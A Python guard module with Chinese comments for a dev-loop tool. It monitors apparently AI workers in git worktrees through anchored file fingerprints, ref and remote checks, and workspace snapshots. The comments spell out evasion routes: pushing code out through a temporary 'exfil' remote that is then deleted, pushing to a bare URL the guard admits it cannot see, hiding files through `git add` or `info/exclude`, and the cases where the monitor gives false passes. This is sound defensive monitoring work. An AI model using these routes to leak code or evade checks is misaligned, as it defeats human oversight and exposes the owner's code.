    """锚里记的 vs 现在盘上的，逐条差异 `(路径, 旧, 新)`。

    ⭐ 这是**给人看的**：重新锚定等于「把现在的状态宣布为正确」，
    而人在按下那一下之前必须看得见自己在批准什么。
    ⚠️ 2026-08-03 用户就是在没有这个的情况下锚的——他看到的输出与首次锚定
    逐字相同，无从分辨这次改变了什么。⛔ 那道「人的闸」当时是蒙着眼睛的。
    """
    #  ⛔ 用 `peek_anchor` 而**不是** `read_anchor`。后者对旧锚/坏锚返回 None
    #     （判定路径上那是对的），而这里的活是**告诉人现在是什么情况**。
    #  ⚠️ 用错的后果用户真撞到过：5 个明明在锚里的文件被印成「（当时不存在）」。
    rec = peek_anchor(con)
    old_files = rec.get("files") or {}
    new_files = files_now(paths, con)
    out: list[tuple[str, str, str]] = []
    #  ⚠️ 宪法自身单列一行。⛔ 只在它**不等于**任何一个受保护文件条目时才列——
    #     否则同一个文件会印两遍（用户实测见过 `constitution.toml（宪法自身）`
    #     与 `.devloop/constitution.toml` 并排出现，看起来像两处改动）。
    old_con = rec.get("constitution_sha", "")
    new_con = _sha(con.source)
    try:
        src_rel = con.source.relative_to(con.project).as_posix()
    except ValueError:
        src_rel = ""
    if old_con != new_con and src_rel not in set(old_files) | set(new_files):
        out.append((f"{con.source.name}（宪法自身）", old_con, new_con))
    for k in sorted(set(old_files) | set(new_files)):
        o, n = old_files.get(k, ""), new_files.get(k, "")
        if o != n:
            out.append((k, o, n))
    return out


def verify_anchor(paths: ProjectPaths, con: Constitution) -> ConstitutionResult:
    """T0：活文件的指纹 vs 项目外的锚。不符 → code 2，⛔ 不许自愈。"""
    rec, why = read_anchor(con)
    if rec is None:
        return con.result(2, stderr=why)

    hits = []
    # 宪法自己在自己的清单里——自指类的闭合点
    now_con = _sha(con.source)
    #  ⛔ 不再写成 `if rec.get(...) and ...`——那个短路正是「锚缺字段就静默
    #     跳过 A-1 自指判据」的口子。字段的存在性现在由 `read_anchor` 硬保证。
    if now_con != rec["constitution_sha"]:
        hits.append(Hit("A-1", "不得修改宪法本身",
                        f"{con.source.name} 指纹 {rec['constitution_sha'][:12]} → {now_con[:12]}"))
    for p in con.files:
        if not p.path:
            continue
        want = rec.get("files", {}).get(p.path)
        if want is None:
            hits.append(Hit(p.clause, p.title or "受保护文件",
                            f"{p.path} 不在锚里——锚是旧的，请重新 anchor"))
            continue
        got = _sha(_abs(paths.project, p.path))
        if got != want:
            what = "被删除" if not got else f"指纹 {want[:12]} → {got[:12]}"
            hits.append(Hit(p.clause, p.title or "受保护文件", f"{p.path} {what}"))
    # ⚠️ 锚不符归 2 而不是 1：这不是「活干得不好」，是**判定基准本身不可信**了，
    #    在人查明之前不该继续派单。
    return con.result(2 if hits else 0, hits,
                      "受保护文件与锚不符" if hits else "")


# ── 快照与事后比对 ────────────────────────────────────────────

def _refs(project: Path) -> dict[str, str]:
    r = subprocess.run(["git", "for-each-ref", "--format=%(refname) %(objectname)"],
                       cwd=project, capture_output=True, text=True,
                       encoding="utf-8", errors="replace")
    out = {}
    for ln in r.stdout.splitlines():
        parts = ln.split()
        if len(parts) == 2:
            out[parts[0]] = parts[1]
    return out


def snapshot(paths: ProjectPaths, con: Constitution) -> Snapshot:
    #  ⭐ 用 `files_now` 而不是就地再写一遍——`write_anchor` 与它必须同源，
    #     两处各写一遍就是下一个「一边宽一边窄」。
    return Snapshot(files_now(paths, con), _refs(paths.project), time.time(),
                    records_mod.fingerprint(paths.project),
                    _remotes(paths.project))


def _remotes(project: Path) -> dict[str, str]:
    """远端清单 `名字 → URL`。

    ⚠️ 用 `git config --get-regexp` 而不是 `git remote -v`：后者一个远端印两行
    （fetch/push），且 push URL 可以与 fetch URL 不同——⛔ 只看 `git remote -v`
    的第一行会漏掉「fetch 指向原处、push 指向别处」这种改法。
    """
    r = subprocess.run(["git", "config", "--get-regexp", r"^remote\..*\.(push)?url"],
                       cwd=project, capture_output=True, text=True,
                       encoding="utf-8", errors="replace")
    out: dict[str, str] = {}
    for ln in r.stdout.splitlines():
        key, _, url = ln.partition(" ")
        if url:
            out[key] = url.strip()
    return out


def check_records(con: Constitution, paths: ProjectPaths,
                  before: Snapshot) -> ConstitutionResult:
    """T5：**不可恢复记录**（各工作副本的 `.devloop/`）有没有被抹掉或改写。

    判据与实现见 `devloop/records.py` 的模块 docstring。要点：
    判的是「**只追加**」而不是「哈希没变」——派单自己就会往台账追加一行、
    往 reports/ 写一份新回执，判成哈希就会**每一单都误报**，
    ⛔ 而天天喊狼来了的守卫会被人关掉，那比没有守卫更坏。

    ⚠️ 归到 A-2（写到隔离区之外）：`constitution.toml` 里 A-2 登记的
    `degrade` 写着「白名单指纹（强但不完全）+ 诚实标注射程」，这条正是把
    那份白名单从「宪法登记过的文件」扩到「git 根本看不见的那批记录」。
    """
    hits = [Hit("A-2", "不得写到隔离区之外（记录被抹）", d)
            for d in records_mod.verify(paths.project, before.records)]
    #  ⛔ 未覆盖条款必须跟着报，和另外三道判据一样。
    #     第一版这里传了空列表，于是 summary() 末尾印出
    #     「⚠️ 未登记任何『判不了』的条款——请确认这是真的」——
    #     而 eco-ob 的宪法实际登记了 8 条。**那句话是假的**，
    #     且它恰恰是这套东西用来防「把没查说成查过了」的那句尾巴。
    return con.result(1 if hits else 0, hits)


def check_files(con: Constitution, before: Snapshot, after: Snapshot) -> ConstitutionResult:
    """T5：受保护文件的二次指纹。

    ⚠️ 这是**发现**，不是**阻止**。它覆盖 worktree 之外的写入——目录联接、
    git hook、活过 `subprocess.run` 的孙进程。发现得晚总比不发现好。
    """
    hits = [Hit(next((p.clause for p in con.files if p.path == k), "?"),
                "受保护文件被改动",
                f"{k}：{v[:12] or '（不存在）'} → {after.files.get(k, '')[:12] or '（不存在）'}")
            for k, v in before.files.items() if after.files.get(k) != v]
    return con.result(1 if hits else 0, hits)


#  ⭐ 工具自己造的隔离分支命名空间。⛔ 写死在这里，不从配置读——
#     从配置读就等于给工人一个「把自己的分支声明成豁免」的开关。
_OWN_PREFIX = "refs/heads/devloop/"
#  ⚠️ `refs/stash` 由 `git stash` 造，工人干活中途 stash 是正常动作，
#     且 `git stash create` 造的是游离对象不建 ref。判它会天天红。
_REF_EXEMPT = ("refs/stash",)


def check_refs(con: Constitution, before: Snapshot, after: Snapshot) -> ConstitutionResult:
    """T5：既有引用被改写/删除（B-2），以及**新引用冒出来**（C-3 push）。

    ## ⛔ 原来只判了一半（2026-08-03 实测）

    原判据只遍历 `before.refs`——**T0 时不存在的 ref 天然不在遍历范围里**。
    于是这条路完全隐身：

    ```
    工人在 worktree 里：
        git push origin HEAD:refs/heads/leaked-branch
        → * [new branch]  HEAD -> leaked-branch        （成功）
        → 本地新增 refs/remotes/origin/leaked-branch
        → check_refs → ⛔ code = 0，零命中
    ```

    代码已经出仓，而台账、回执、diff 里一个字都查不到。

    ⚠️ 而 `constitution.toml` 当时声称挡 C-3 的是一条**静态检查**
    （扫工具自己的 `devloop/*.py` 里有没有 `push`）——那管的是**工具的代码**，
    与工人在 worktree 里敲什么命令毫无关系。⛔ 工人手里有 Bash。

    ## ⭐ 现在判什么

    | 情形 | 条款 | 说明 |
    |---|---|---|
    | 既有 ref 改写 / 消失 | B-2 | 原判据，不变 |
    | 新增 `refs/remotes/*` | **C-3** | ⭐ 有东西被 push 出去了 |
    | 新增 `refs/heads/*`（非 `devloop/`） | B-2 | 工人在工具命名空间外建了分支 |
    | 新增 `refs/tags/*` | B-2 | 同上 |
    | 远端被增加 / 改 URL | **C-3** | ⚠️ `git remote add` 后推过去，ref 一条都不变 |

    ## ⛔ 判不了的那部分（必须说出来，不许含糊）

    `git push <完整URL> HEAD:refs/heads/x` —— 不经过任何具名远端，
    **本地不留任何痕迹**：不建 `refs/remotes/*`、不改 `remote.*.url`、
    reflog 里也没有。⚠️ 本判据对这一形态**完全无效**。
    ⭐ 它登记在 `[[unjudged]]` 的 C-3b，每次判定的尾巴都会把它报出来。
    ⛔ 真边界只有一个：**事前不给网络能力**（受限执行环境），当前不具备。

    ## ⚠️ 并发与「窗口里有第二个人」

    `--parallel > 1` 时别的单会造 `refs/heads/devloop/*`——已豁免。
    但**人**在窗口里自己 push / 建分支会假红，与 `check_workspace` 同一个前提：
    这道判据只在「窗口里只有一个行为主体」时成立。
    """
    hits = []
    for name, obj in before.refs.items():
        now = after.refs.get(name)
        if now is None:
            hits.append(Hit("B-2", "不得删除或改写既有引用", f"{name} 消失了"))
        elif now != obj:
            hits.append(Hit("B-2", "不得删除或改写既有引用",
                            f"{name}：{obj[:12]} → {now[:12]}"))

    #  ⭐ 新冒出来的引用。⛔ 这一段原来整个不存在。
    for name in sorted(set(after.refs) - set(before.refs)):
        if name.startswith(_OWN_PREFIX) or name in _REF_EXEMPT:
            continue
        if name.startswith("refs/remotes/"):
            #  ⛔ **不许写「有东西被推出去了」。** 实测：`git fetch origin`
            #     （纯只读，什么都没推）同样会新增 `refs/remotes/origin/*`，
            #     于是那句话在只读动作上字面为假，而它是 halt 级的。
            #  ⭐ 本判据**分不出方向**——要分得出得去问真远端（`git ls-remote`）。
            hits.append(Hit("C-3", "远端跟踪引用变了",
                            f"{name} 是 T0 时没有的远端跟踪引用"
                            f"——⚠️ push 与 fetch 都会造成它，"
                            f"⛔ 本判据分不出方向，请人判"))
        else:
            #  ⚠️ `git fetch --tags` 会拉进 `refs/tags/*`、`git notes` 会造
            #     `refs/notes/*`——同样不是「工人新建了分支」。文案照实说。
            hits.append(Hit("B-2", "工具命名空间外冒出新引用",
                            f"{name} 是 T0 时没有的引用"
                            f"（工具自己的分支都在 {_OWN_PREFIX} 下）"
                            f"——⚠️ 也可能是 fetch/notes 拉进来的，请人判"))

    #  ⭐ 远端清单。⚠️ 空 dict 表示「这一维没采」（老快照），⛔ 与「没有远端」区分：
    #     两者都比不出差异，但前者不该让人以为查过了。
    if before.remotes or after.remotes:
        for nm in sorted(set(after.remotes) - set(before.remotes)):
            hits.append(Hit("C-3", "不得新增远端",
                            f"远端 {nm} = {after.remotes[nm]} 是 T0 时没有的"))
        for nm, url in sorted(before.remotes.items()):
            new = after.remotes.get(nm)
            #  ⛔ **远端消失也要报。** 原来这里写 `if new is not None`，
            #     于是 `git remote add exfil <地址> && git push exfil … &&
            #     git remote remove exfil` 三步之后，两维**同时归零**：
            #     `remote remove` 连带删掉 `refs/remotes/exfil/*`。
            #     ⚠️ 实测 code=0，而东西已经落在别人的服务器上。
            if new is None:
                hits.append(Hit("C-3", "远端被删掉了",
                                f"远端 {nm}（{url}）在 T0 时还在，现在没了"
                                f"——⚠️ 「加一个远端、推出去、再删掉」正是这个形状"))
            elif new != url:
                hits.append(Hit("C-3", "不得改远端地址",
                                f"远端 {nm}：{url} → {new}"))
    return con.result(1 if hits else 0, hits)


def check_tree(con: Constitution, *, worktree: Path, base: str) -> ConstitutionResult:
    """T2：worktree 内受保护路径的 **base 锚定**漂移判据。

    ⚠️ `base` 必须由编排方注入，**⛔ 不许从 worktree 的 HEAD 现推**：
    HEAD 只在工人没自提交时才等于 base，而**工人自提交正是本判据要抓的动作**
    ——用它当锚，等于攻击成功时锚自己也跟着移动。

    三条子判据，合起来对 commit / skip-worktree / info-exclude / gitignore 全免疫：

      A) 已跟踪漂移：`git ls-tree -r <base>` 的 blob 与工作区实际内容比对
      B) 删除      ：base 里有、工作区没有
      C) 新增      ：**base 里没有的文件**（已跟踪 ∪ 未跟踪 − base）。
                     ⛔ 判据不是「未跟踪」——工人 `git add` 一下就绕过去了，
                        而那是干完活再自然不过的动作，不是攻击。
                     ⛔ `-o` 仍不带 `--exclude-standard`：带了就受 `.gitignore`
                        与 `info/exclude` 支配，而那两处工人都写得到。
    """
    if not base or base == "HEAD":
        return con.result(
            2,
            stderr="check_tree 需要显式的 base 提交。⛔ 不接受 HEAD："
                   "工人自提交正是本判据要抓的动作，用 HEAD 当锚等于锚跟着动。")

    def git(*a: str):
        # ⛔ `-c core.quotepath=off` 不是可选的。git **默认**把非 ASCII 路径转义成
        #    `"ref/\345\201\267...json"`（带引号的八进制），于是任何按字面比对路径的
        #    守卫都会**静默漏掉每一个中文名文件**。
        #    ⚠️ 而 eco-ob 的 `01_设计文档/` 正是中文名，正是宪法 C-1 要保护的那批——
        #    **守卫会恰好在它最该保护的路径上变成空的**。实测（2026-07-28）：
        #      默认        →  "ref/\345\201\267\345\201\267\345\212\240\347\232\204.json"
        #      quotepath=off →  ref/偷偷加的.json
        return subprocess.run(["git", "-c", "core.quotepath=off", *a], cwd=worktree,
                              capture_output=True, text=True,
                              encoding="utf-8", errors="replace")

    pats = [p for p in con.trees if p.glob or p.path]
    if not pats:
        # ⚠️ 覆盖 0 条路径是**被显式声明过**的（load 会拦住没声明的情形），
        #    但它必须变成一句每次都印出来的话，而不是一片安静的绿。
        return con.result(
            0, extra_unjudged=(
                f"树内判据覆盖 0 条路径（{con.tree_none_why or '未说明理由'}）",))

    # ⛔ **不把 glob 交给 git 的 pathspec**。实测（2026-07-28）：
    #      git ls-tree -r HEAD -- 'ref/*.json'   →  一行都没有
    #      git ls-tree -r HEAD -- 'ref/'         →  ref/a.json
    #      :(glob) 魔法 ls-tree 直接报 "pathspec magic not supported"
    #    也就是说，按直觉写 `-- <glob>` 的守卫**一个文件都匹配不到、永远报无命中**
    #    ——正是本模块在防的第一种假绿，差点出现在防它的代码里。
    #    改为：从 git 取全量清单，在 Python 里用 fnmatch 过滤，
    #    **两侧（已跟踪 / 未跟踪）用同一套匹配逻辑**，不会一边宽一边窄。
    r = git("ls-tree", "-r", "--format=%(objectname) %(path)", base)
    if r.returncode != 0:
        return con.result(
            2,
            stderr=f"读不到 base {base} 的文件清单：{r.stderr.strip()[:200]}")
    tracked = {}
    for ln in r.stdout.splitlines():
        obj, _, rel = ln.partition(" ")
        if rel:
            tracked[rel.strip()] = obj.strip()

    # ⛔ 新增判据的正确定义是「**base 里没有的文件**」，不是「未跟踪的文件」。
    #
    #   早先只取 `ls-files -o`（未跟踪），于是工人对新增文件跑一句 `git add`
    #   ——**连提交都不用**——那个文件就同时不在 `ls-tree <base>`（base 那会儿
    #   它还不存在）、也不在 `ls-files -o`（进索引了，不再算未跟踪）。三路全瞎。
    #   ⚠️ 而 `git add` **不是攻击**，是工人干完活再自然不过的动作。
    #   实测（2026-07-28）：add 之后 `ls-files -o` 输出为空，`ls-files -c` 里有它。
    #
    # ⛔ `-o` 仍然不带 --exclude-standard：带了就受 .gitignore 与 info/exclude
    #    支配，而那两处工人都写得到（实测：往 info/exclude 追一行，
    #    `git status --porcelain` 完全无痕，而不带该选项的 ls-files -o 照样列出来）。
    cached = [x.strip() for x in git("ls-files", "-c").stdout.splitlines() if x.strip()]
    others = [x.strip() for x in
              git("ls-files", "-o", "--no-empty-directory").stdout.splitlines()
              if x.strip()]
    added = [rel for rel in dict.fromkeys(cached + others) if rel not in tracked]

    hits: list[Hit] = []
    for p in pats:
        pat = p.glob or p.path
        title = p.title or "受保护路径"
        for rel, obj in tracked.items():
            if not _match(rel, pat):
                continue
            f = worktree / rel
            if not f.is_file():
                hits.append(Hit(p.clause, title, f"{rel} 被删除"))
                continue
            now = git("hash-object", str(f)).stdout.strip()
            if now and now != obj:
                hits.append(Hit(p.clause, title,
                                f"{rel} 内容变了（{obj[:12]} → {now[:12]}）"))
        if p.allow_added:
            continue
        for rel in added:
            #  ⛔ 运行产物不算「新增文件」。⚠️ 不剔除的话，`.devloop/**` 这类
            #     模式会被 `reports/`、`jobs/`、`telemetry.jsonl`、
            #     `__pycache__/` 打成**每单必红**——而天天红的守卫等于没有守卫。
            if _is_artifact(rel):
                continue
            if _match(rel, pat):
                # ⚠️ 文案不说「未跟踪」——判据放宽之后 add/commit 过的文件
                #    也走这条分支，再印「未跟踪」就是一句字面为假的话。
                hits.append(Hit(p.clause, title, f"{rel} 是 base 里没有的新增文件"))

    return con.result(1 if hits else 0, hits)


#  ⛔ **写死在 Python 里，不读 `.gitignore` / `info/exclude`。**
#     `check_tree` 取未跟踪文件时刻意不带 `--exclude-standard`，理由是
#     那两处**工人都写得到**——把排除名单交给工人等于把守卫的开关交给他。
#     ⭐ 同理，这份名单也不许从 `constitution.toml` 读：那是受保护文件没错，
#     但它在 worktree 里，而树内判据判的就是 worktree。
_ARTIFACT_SEG = ("__pycache__", ".ruff_cache", ".pytest_cache", ".mypy_cache",
                 ".venv", "node_modules", ".egg-info")
#  工具自己往项目 `.devloop/` 里写的东西。⚠️ `RUNTIME_DIRS` 是已经被定性为
#  「运行产物」的那份清单，⛔ 在这里再抄一遍就是下一个「一边宽一边窄」。
_ARTIFACT_DEVLOOP_DIR = tuple(records_mod.RUNTIME_DIRS) + ("reports",)
_ARTIFACT_DEVLOOP_FILE_PREFIX = ("telemetry.jsonl", "findings.jsonl")
_ARTIFACT_TASK_PREFIX = ("fix-", "verify-")      # `cmd_audit --spec` 生成的


def _tracked_paths(project: Path) -> list[str]:
    """git 认得的文件（索引里的）。⛔ 不是「盘上的」。

    ⚠️ 用 `ls-files` 而不是 `ls-tree HEAD`：`load()` 可能跑在**还没有提交**的
    项目上（`git init` 之后、第一次 commit 之前），那时 `ls-tree HEAD` 直接报错。
    索引在两种情形下都有内容，且与 `check_tree` 的射程足够接近。

    ⛔ 不是 git 仓库时返回 `None`（**不是空列表**）——两者要分开：
    「仓库里没有匹配的文件」和「这根本不是仓库」对人是两条不同的路。
    ⚠️ 混成一句会印出「模式多半写错了」，而真因是目录压根没进版本控制。
    """
    r = subprocess.run(["git", "-c", "core.quotepath=off", "ls-files"],
                       cwd=project, capture_output=True, text=True,
                       encoding="utf-8", errors="replace")
    if r.returncode != 0:
        return None
    return [x.strip() for x in r.stdout.splitlines() if x.strip()]


def _is_artifact(rel: str) -> bool:
    """这条路径是**工具/工具链自己的运行产物**吗。

    ⚠️ 它只用在「新增文件」那一档。⛔ 已跟踪文件被改/被删**永远**算命中——
    产物不会被跟踪，所以这里放宽不会漏掉真篡改。

    ⭐ 2026-08-03：G-93（`findings.jsonl` 让宪法 A-2 全阶段连坐）与
    捞回的《10》（`_review/answer_keys/**` 被 `__pycache__` 打中）是同一个形状：
    **工具自己写进项目的东西，被守卫当成了人为改动。**
    """
    parts = rel.replace("\\", "/").split("/")
    if any(seg in _ARTIFACT_SEG or seg.endswith(".egg-info") for seg in parts):
        return True
    if parts[0] == ".devloop" and len(parts) > 1:
        if parts[1] in _ARTIFACT_DEVLOOP_DIR:
            return True
        if any(parts[1].startswith(x) for x in _ARTIFACT_DEVLOOP_FILE_PREFIX):
            return True
        if (parts[1] == "tasks" and len(parts) > 2
                and any(parts[2].startswith(x) for x in _ARTIFACT_TASK_PREFIX)):
            return True
    return False


def _match(rel: str, pat: str) -> bool:
    """路径匹配。`*` 不跨目录分隔符，`**` 跨。

    ⚠️ 自己写而不是直接用 `fnmatch`：`fnmatch` 的 `*` **跨 `/`**，
    于是 `ref/*.json` 会匹配 `ref/sub/deep/x.json`——比人写这条时的意图宽。
    守卫**过宽和过窄一样坏**：过窄漏抓，过宽会天天误报，而天天误报会训练人
    去忽略上报，那比不上报更糟。
    """
    import re
    # ⛔ 目录形式（末尾 `/`）**也要走同一套正则**。早先它走的是纯字面
    #    `startswith`，于是 `ref*/`、`r?f/` 这类模式永远匹配不到任何东西
    #    ——又一个「守卫的目标不存在」，而且它长得像在保护一整个目录。
    if pat.endswith("/"):
        pat += "**"
    parts = re.split(r"(\*\*|\*|\?)", pat)
    rx = "".join({"**": ".*", "*": "[^/]*", "?": "[^/]"}.get(x, re.escape(x))
                 for x in parts)
    return re.fullmatch(rx, rel) is not None


# ── 活工作区守卫：工人有没有写到 worktree 外面 ────────────────

def workspace_state(project: Path) -> dict[str, str]:
    """项目**活工作区**的状态快照。

    ⭐ 这条把 A-2 从「完全判不了」往回拉了一步：工人写到 worktree 之外的
    **任意路径**不可枚举，但「这个项目的活工作区变没变」是可判定的。

    ⚠️ 判据用 `git status --porcelain -uall` 的**行集合**，不是逐文件哈希：
      · 便宜——大仓库全量哈希会让每单多花几秒
      · 够用——改已跟踪文件、加新文件、删文件，三种都会出现在里面
      · ⛔ **不带 `--ignored`**：台账、回执、作业记录每单都变，
        把它们算进来这道守卫会天天红，而**天天红的守卫等于没有守卫**

    ⚠️ 它盯的是**项目本身**，不是 worktree。worktree 是 `git worktree` 建的
    独立检出，它里面的改动不会出现在项目的 `git status` 里——
    这正是我们要的：工人在 worktree 里干活是**正常**，写到外面才是问题。

    ## ⛔ 它只在「窗口里只有一个行为主体」时成立

    T0 → T5 之间若**除了工人还有别人动过这个项目**，这道判据两头都坏，
    2026-07-28 实测复现（两条都在临时仓库里跑过）：

    | 情形 | 读数 |
    |---|---|
    | 人在间隙里做日常动作（改文件、提交、再改） | **1 条命中**，而工人一个字没干 —— 假红 |
    | 工人越界写活工作区，人回来顺手 `git add && commit` | **干净，0 条** —— 假绿 |

    第二条尤其致命：人的一次提交**把证据从 `git status` 里抹掉了**，
    而本判据的判据就是 status 的行集合。**它恰好在真出事的时候失灵。**

    ⛔ 所以：**子进程路径可用**（派单到验收之间没有第二个行为主体），
    **交接协议路径不可用**（那条路按定义就把人塞进了窗口）。
    ⚠️ 命中文案因此不许写「工人怎样怎样」——判不出是谁改的。
    """
    r = subprocess.run(["git", "-c", "core.quotepath=off",
                        "status", "--porcelain", "-uall"],
                       cwd=project, capture_output=True, text=True,
                       encoding="utf-8", errors="replace")
    out: dict[str, str] = {}
    for ln in r.stdout.splitlines():
        if len(ln) > 3:
            out[ln[3:].strip()] = ln[:2]
    return out


def check_workspace(con: Constitution, before: dict[str, str],
                    after: dict[str, str]) -> ConstitutionResult:
    """比对活工作区的两次快照。⚠️ 这是**发现**不是**阻止**。

    ⛔ `con` 是 2026-08-03 补的。之前这里传 `[]` 当 unjudged，于是 `summary()`
    末尾印出「⚠️ 未登记任何『判不了』的条款——请确认这是真的」——**一句假话**
    （本仓登记了 7 条）。⚠️ 而它只在 `not r5.clean` 时才印（`cli.py`），
    也就是**真命中、人最认真读的那一刻**，尾巴是假的。
    ⭐ 同一个 bug 在 `check_records` 那里修过并留了注释，这一处漏了——
    这正是「同样的账在多处各记一遍」必然的结局，也是 `Constitution.result` 存在的理由。
    """
    hits = []
    for path, st in after.items():
        if before.get(path) != st:
            was = before.get(path)
            hits.append(Hit("A-2", "活工作区变了（⚠️ 判不出是谁改的）",
                            f"{path}（{'新出现' if was is None else was + ' → ' + st}）"))
    for path in before:
        if path not in after:
            hits.append(Hit("A-2", "活工作区变了（⚠️ 判不出是谁改的）",
                            f"{path}（原有的改动消失了——被还原或被提交掉）"))
    return con.result(1 if hits else 0, hits)
